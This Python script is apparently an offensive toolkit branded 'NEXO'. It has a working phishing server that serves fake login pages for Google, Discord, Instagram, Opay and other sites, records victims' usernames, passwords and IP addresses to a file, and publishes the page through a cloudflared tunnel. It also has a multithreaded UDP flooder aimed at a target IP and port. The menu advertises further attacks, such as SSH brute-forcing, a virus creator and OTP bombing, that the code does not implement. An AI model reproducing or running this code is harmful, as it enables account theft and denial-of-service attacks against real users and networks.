# --- [ SYSTEM IMPORTS: STRICT VERTICAL ] ---
import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
import logging
import threading
import re
from flask import Flask
from flask import request
from flask import render_template
from flask import redirect
from flask import make_response
import phonenumbers
from phonenumbers import geocoder
from phonenumbers import carrier
from phonenumbers import timezone

# --- [ PATH & CONFIG FIX ] ---
base_dir = os.path.dirname(os.path.abspath(__file__))
template_dir = os.path.join(base_dir, 'templates')

# --- [ GLOBAL CONFIG ] ---
app = Flask(__name__, template_folder=template_dir)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
target_num = "NONE SET" 
version = "V8.0 BLACKOUT-FINAL"
flask_running = False

# --- [ SYSTEM COLORS ] ---
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[91m'
W = '\033[0m'
B = '\033[1m'

def clear(): 
    os.system('clear' if os.name == 'posix' else 'cls')

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*50)
    print(r"  _   _  _______   _____  ")
    print(r" | \ | | | ____\ \ / / _ \ ")
    print(r" |  \| | | |__   \ V / | | |")
    print(r" | . ` | |  __|   > <| | | |")
    print(r" | |\  | | |____ / . \ |_| |")
    print(r" |_| \_| |______/_/ \_\___/ ")
    print("═"*50 + f"{W}")
    print(f"  {Y}STATION: {W}NEXO-TECH COMMAND")
    print(f"  {Y}VERSION: {R}{version}")
    print(f"  {Y}MODULE: {C}{module}")
    if link:
        print(f"  {Y}STRIKE LINK: {G}{link}")
    print(f"{R}" + "═"*50 + f"{W}\n")

# --- [ THE DATA CAPTURE ENGINE ] ---

@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    # Capture Real Victim IP (Bypassing Tunnel)
    v_ip = request.headers.get('CF-Connecting-IP') or \
           request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # Capture Victim Connection Port
    v_port = request.environ.get('REMOTE_PORT', 'Unknown')
    
    if request.method == 'GET':
        try: 
            return render_template(f"{site}.html")
        except: 
            return f"Error: {site}.html not found in /templates folder."
            
    if request.method == 'POST':
        u = request.form.get('user')
        p = request.form.get('pass')
        
        # --- [ TERMINAL DISPLAY: EXACT FORMAT ] ---
        print(f"\n{R}╔{'═'*45}╗")
        print(f"  {G}[!] NEW STRIKE CAPTURED: {site.upper()}")
        print(f"  {Y}Gmail:    {W}{u}")
        print(f"  {Y}Password: {W}{p}")
        print(f"  {Y}IP:       {W}{v_ip}")
        print(f"  {Y}Port:     {W}{v_port}")
        print(f"{R}╚{'═'*45}╝{W}\n")
        
        # --- [ PERMANENT STORAGE ] ---
        with open("nexo_hits.txt", "a") as f:
            f.write(f"--- [ {time.strftime('%Y-%m-%d %H:%M:%S')} ] ---\n")
            f.write(f"Site: {site.upper()}\n")
            f.write(f"Gmail: {u}\n")
            f.write(f"Password: {p}\n")
            f.write(f"IP: {v_ip}\n")
            f.write(f"Port: {v_port}\n")
            f.write("-" * 30 + "\n")
            
        return redirect(f"https://www.{site}.com")

# --- [ FUNCTIONAL MODULES ] ---

def start_phish():
    global flask_running
    nexo_banner("SOCIAL PHISHER")
    print(f"  {G}1.{W} Google")
    print(f"  {G}2.{W} Opay")
    print(f"  {G}3.{W} Discord")
    print(f"  {G}4.{W} Instagram")
    print(f"  {G}5.{W} Facebook")
    print(f"  {G}6.{W} TikTok")
    print(f"  {G}7.{W} Snapchat")
    print(f"  {G}8.{W} Twitter")
    print(f"  {G}9.{W} Github")
    print(f"  {G}10.{W} Youtube")
    choice = input(f"\n{C}SELECT SITE NO: {W}")
    sites = {
        "1":"google", "2":"opay", "3":"discord", "4":"instagram", 
        "5":"facebook", "6":"tiktok", "7":"snapchat", "8":"twitter", 
        "9":"github", "10":"youtube"
    }
    site = sites.get(choice)
    if not site:
        return
    
    os.system("pkill -9 cloudflared")
    if not flask_running:
        threading.Thread(target=lambda: app.run(port=5000, host='0.0.0.0', use_reloader=False), daemon=True).start()
        flask_running = True
    
    with open("tunnel.log", "w") as log_file:
        subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"], stdout=log_file, stderr=log_file)
    
    url = None
    print(f"{Y}[*] Generating Tunnel Link (Wait 30s)...{W}")
    for _ in range(35):
        if os.path.exists("tunnel.log"):
            with open("tunnel.log", "r") as f:
                content = f.read()
                match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
                if match: 
                    url = match.group(0)
                    break
        time.sleep(2)
    if url:
        nexo_banner("PHISH-LINK ACTIVE", link=f"{url}/login/{site}")
        input(f"\n{R}[ENTER TO STOP SERVER]{W}")
        os.system("pkill -9 cloudflared")

def phone_trace():
    global target_num
    nexo_banner("OSINT TRACER")
    num = input(f"{Y}[+] TARGET NUMBER: {W}")
    try:
        p = phonenumbers.parse(num)
        target_num = num
        print(f"  {G}Region: {W}{geocoder.description_for_number(p, 'en')}")
        print(f"  {G}Carrier: {W}{carrier.name_for_number(p, 'en')}")
    except: 
        print(f"  {R}[-] Trace Failed.")
    input("\nEnter to return...")

def ddos_strike():
    nexo_banner("IP FLOODER")
    ip = input(f"{Y}[+] TARGET IP: {W}")
    port = int(input(f"{Y}[+] PORT: {W}"))
    data = random._urandom(1024)
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try: 
                s.sendto(data, (ip, port))
            except: 
                break
    for _ in range(300): 
        threading.Thread(target=flood, daemon=True).start()
    input(f"\n{R}[STRIKE ACTIVE - ENTER TO STOP]{W}")

def main():
    global target_num
    while True:
        nexo_banner("MASTER CONTROL")
        print(f"  {R}╔{'═'*35}╗")
        print(f"  {R}║ {Y}ACTIVE TARGET STATUS:")
        print(f"  {R}║ {G}{target_num}")
        print(f"  {R}╚{'═'*35}╝{W}\n")
        print(f"  {G}1.{W} Social Phisher")
        print(f"  {G}2.{W} Phone Tracer")
        print(f"  {G}3.{W} IP UDP Flooder")
        print(f"  {G}4.{W} Port Scanner")
        print(f"  {G}5.{W} SSH Brute-Force")
        print(f"  {G}6.{W} Virus Creator")
        print(f"  {G}7.{W} MAC Spoofer")
        print(f"  {G}8.{W} Bluetooth Crash")
        print(f"  {G}9.{W} OTP Bomber Lock")
        print(f"  {G}10.{W} View Strike Logs")
        print(f"  {R}0.{W} Shutdown")
        c = input(f"\n{C}NEXO-PRO > {W}")
        if c == '1': start_phish()
        elif c == '2': phone_trace()
        elif c == '3': ddos_strike()
        elif c == '10':
            nexo_banner("LOGS")
            os.system("cat nexo_hits.txt 2>/dev/null || echo 'No logs yet.'")
            input("\nEnter to return...")
        elif c == '0': 
            os.system("pkill -9 cloudflared")
            sys.exit()

if __name__ == "__main__": 
    main()
